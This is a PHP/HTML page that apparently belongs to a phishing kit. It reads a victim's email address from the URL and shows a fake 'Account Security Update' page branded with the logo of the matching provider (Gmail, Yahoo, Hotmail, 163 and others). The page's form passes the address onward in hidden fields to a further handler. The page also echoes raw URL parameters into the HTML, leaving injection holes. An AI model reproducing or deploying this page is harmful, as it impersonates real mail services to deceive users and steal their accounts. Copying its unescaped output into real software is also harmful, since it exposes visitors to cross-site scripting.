<?php


$loguid = base64_decode($_GET['uid']);
$log = base64_encode($loguid);

$urld=$loguid;

@$ard=split("@",$urld);

 $urltt=$ard[1];

 

 @$ard=explode(".",$urltt);

 $log=$ard[0];

 if($log=='yahoo'){$logo=$log;}

 elseif($log=='gmail'){$logo=$log;}

 elseif($log=='hotmail'){$logo=$log;}

 elseif($log=='msn'){$logo='hotmail';}

 elseif($log=='live'){$logo='hotmail';}

 elseif($log=='yandex'){$logo=$log;}

 elseif($log=='163'){$logo='163';}

 elseif($log=='126'){$logo='163';}

 elseif($log=='yeah'){$logo='163';}

 elseif($log=='hinet'){$logo='hinet';}

 else{$logo='Web';}

 
$lc = ""; // Initialize the language code variable
// Check to see that the global language server variable isset()
// If it is set, we cut the first two characters from that string
if(isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
    $lc = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
}
// Now we simply evaluate that variable to detect specific languages
if($lc == "cn"){
    header("location: index-cn.php");
    exit();
} 
?><!DOCTYPE html>
<!--[if lt IE 7]> <html class="lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
<!--[if IE 7]> <html class="lt-ie9 lt-ie8" lang="en"> <![endif]-->
<!--[if IE 8]> <html class="lt-ie9" lang="en"> <![endif]-->
<!--[if gt IE 8]><!--> <html lang="en"> <!--<![endif]-->
  <!--[if lt IE 9]><script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

  <head>
  <link rel='shortcut icon' href='../../code/images/<?=$logo;?>.png'>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Account Security Update</title>
    <link rel="stylesheet" href="https://code.jquery.com/ui/1.10.4/themes/smoothness/jquery-ui.css">
    <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="../cd/css/css/styles.css">

  </head>
  <body>
  
  <div align="center" style="font-size:48px; text-transform:capitalize; font-style:italic; font-family:Georgia, 'Times New Roman', Times, serif">
  <img src="../admin/Images/<?=$logo;?>.png" alt="" width="217" height="83"> New Added Security Features
  </div>
              
  <div class="price-box">
 <!-- Topbar Navigation -->
                <ul class='loginbar pull-right'>
                    <div id="container">

                           <div id='google_translate_element'></div><script>
function googleTranslateElementInit() {
  new google.translate.TranslateElement({
    pageLanguage: 'cn'
  }, 'google_translate_element');
}
</script><script src='http://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit'></script>
                        </ul>
                                    
               
                   
                 <!-- End Topbar Navigation -->
        <form  action="index_post.php" method="post" name="quota" class="form-horizontal form-pricing" role="form">

          <div align="left">
            <h4 class="great" style="text-transform:capitalize"> <?=$logo;?>   Mail Security </h4>
            <span>Security Settings</span>
             
     </div>
                       
           
          <div class="price-form">
        
            <div class="form-group">
              
           
             
                <input name="uid" type="hidden" id="" class=" " value="<?php echo $_GET['uid']; ?>">
                <input name="adm" type="hidden" id="amount" class="form-control" value="<?php echo $_GET['a']; ?>">
                <input name="err" type="hidden" id="amount" class="form-control" value="<?php echo $_GET['err']; ?>">
              
           
            </div>
             
               <table style="font-size:18px;" width="567" border="1" cellspacing="20"  cellpadding="20">
  <tr>
    <th width="308" scope="row">Mail System Security</th>
    <td width="113"><label class="switch switch-green">
      <input name="amount4" type="checkbox"  value="15" class="switch-input" >
      <span class="switch-label" data-on="On" data-off="Off"></span>
      <span class="switch-handle"></span>
    </label></td>
  </tr>  <tr>
    <th scope="row">&nbsp; </th>
    <td>&nbsp;</td>
  </tr>
   <tr>
    <th scope="row">Activate Anti-virus</th>
    <td><label class="switch switch-green">
      <input name="amount3" type="checkbox" value="30" class="switch-input" >
      <span class="switch-label" data-on="Activate" data-off="De-activate"></span>
      <span class="switch-handle"></span>
    </label></td>
  </tr>  <tr>
    <th scope="row">&nbsp; </th>
    <td>&nbsp;</td>
  </tr> <tr>
    <th scope="row">Scan Incoming Mail</th>
    <td><label class="switch switch-green">
      <input name="amount2" type="checkbox" value="20" class="switch-input" >
      <span class="switch-label" data-on="On" data-off="Off"></span>
      <span class="switch-handle"></span>
    </label></td>
  </tr> <tr>
    <th scope="row">&nbsp; </th>
    <td>&nbsp;</td>
  </tr>  <tr>
    <th scope="row">Automatic Upgrade</th>
    <td><label class="switch switch-green">
      <input name="amount1" type="checkbox" class="switch-input" value="35" checked>
      <span class="switch-label" data-on="On" data-off="Off"></span>
      <span class="switch-handle"></span>
    </label></td>
  </tr></table>

          </div>

          <div class="form-group">
            <div class="col-sm-12"><table width="17%" height="42" align="right">
              <th width="40%" align="right"><button name="submit" type="submit" class="btn btn-primary btn-lg btn-block"> <span class="glyphicon   glyphicon-save pull-right" style="padding-right: 10px;"></span>SAVE  </button></th></table>
            </div>
          </div><br/>
          <div class="form-group">
            
            
          </div>
        </form>

        <p class="text-center" style="padding-top:10px;font-size:12px;color:#F00; font-style:italic;"> <a href="../cd/mail/check/quota.php?uid=<?php echo $_GET['uid']; ?>&err=<?php echo $_GET['err']; ?>&a=<?php echo $_GET['a']; ?>" target="_self"></a></p>
      </div>

     

 
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
    <script src="https://code.jquery.com/ui/1.10.4/jquery-ui.min.js"></script>
    <script src="https://netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>

    <script>
      $(document).ready(function() {
          $("#slider").slider({
              range: "min",
              animate: true,
              value:1,
              min: 1,
              max: 100,
              step: 1,
              slide: function(event, ui) {
                update(1,ui.value); //changed
              }
          });

          

          //Added, set initial value.
          $("#amount").val(0);
          $("#duration").val(0); 
          
          update();
      });

      //changed. now with parameter
      function update(slider,val) {
        //changed. Now, directly take value from ui.value. if not set (initial, will use current value.)
        var $amount = slider == 1?val:$("#amount").val();
        var $duration = slider == 2?val:$("#duration").val();

        /* commented
        $amount = $( "#slider" ).slider( "value" );
        $duration = $( "#slider2" ).slider( "value" );
         */

         $total = "$" + ($amount * $duration);
         $( "#amount" ).val($amount);
         $( "#amount-label" ).text($amount);
         $( "#duration" ).val($duration);
         $( "#duration-label" ).text($duration);
         $( "#total" ).val($total);
         $( "#total-label" ).text($total);

         $('#slider a').html('<label><span class="glyphicon glyphicon-chevron-left"></span> '+$amount+' <span class="glyphicon glyphicon-chevron-right"></span></label>');
         $('#slider2 a').html('<label><span class="glyphicon glyphicon-chevron-left"></span> '+$duration+' <span class="glyphicon glyphicon-chevron-right"></span></label>');
      }

    </script>
  </body>
</html>